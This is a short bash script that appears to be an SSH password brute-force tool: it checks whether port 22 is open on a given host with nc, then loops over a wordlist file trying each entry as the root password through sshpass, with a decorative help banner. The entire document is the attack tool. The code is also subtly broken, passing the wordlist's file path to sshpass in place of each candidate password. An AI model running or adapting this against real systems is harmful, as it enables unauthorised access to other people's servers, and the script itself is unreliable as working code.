while [[ $# -gt 0 ]]
do
key="$1"
case $key in
-host)
host="$2"
port=22
nc -zv $host $port &>/dev/null
if [ $? -eq 0 ]; then
        echo -e "\033[92mon : $host"
        echo ""
    else
        echo -e "\033[91moff $host"
    fi
shift
;;
-password)
password="$2"
pas=$(cat "$password")
for passong in $pas; do
echo -e "\033[93mFind password for $host : $passong"
sshpass -p "$password" ssh root@$host -p 22 "echo 'Successful login with password: $passong'; break" &>/dev/null
if [ $? -eq 0 ]; then
        echo -e "\033[92mpassword $host : $passong"
break
fi
done
shift
;;
-help)
if [ $? -eq 0 ];then
echo -e "\033[94m#####    && ++++++"
echo -e "  #   &&&   +   ++"
echo -e "  # &&&     ++++++"
echo -e "  # &&&     ++     %%  %%"
echo -e "  #   &&&   ++       %%"
echo -e "  #      && ++     %%  %%\033[00m"
echo ""
echo -e "\033[96minstructions:"
echo -e " -host / -password"
echo -e "This tool only works for TCP protocol which is known as number 22"
fi
shift
;;
*)
echo -e "\033[91merror"
;;
esac
shift
done
